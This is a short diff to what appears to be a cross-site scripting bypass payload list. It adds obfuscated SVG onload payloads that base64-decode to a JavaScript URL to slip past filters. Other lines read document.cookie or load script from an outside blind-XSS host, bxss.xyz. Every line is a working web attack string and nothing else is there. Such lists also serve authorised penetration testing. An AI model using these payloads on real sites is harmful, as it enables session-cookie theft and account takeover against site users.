@@ -1,6 +1,8 @@
 XSS Bypass:
 
-<img src=1 only onerror=alert()>
+"><img src=1 only onerror=alert()>
+"><svg%2FONxss%3D'0'%2FONload%3Dlocation%3Dwindow[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ%3D%3D`%3B%2F%2F
+"><svg/ONxss='0'/ONload=location=window[`atob`]`amF2YXNjcmlwdDphbGVydCgxKQ==`;//
 <svg%20oNinad=1%20onload=alert(document.cookie)>
 ';"/></textarea></script><script/src=/bxss.xyz/></script>
 ';"/></textarea></script><script/src=/bxss.xyz/
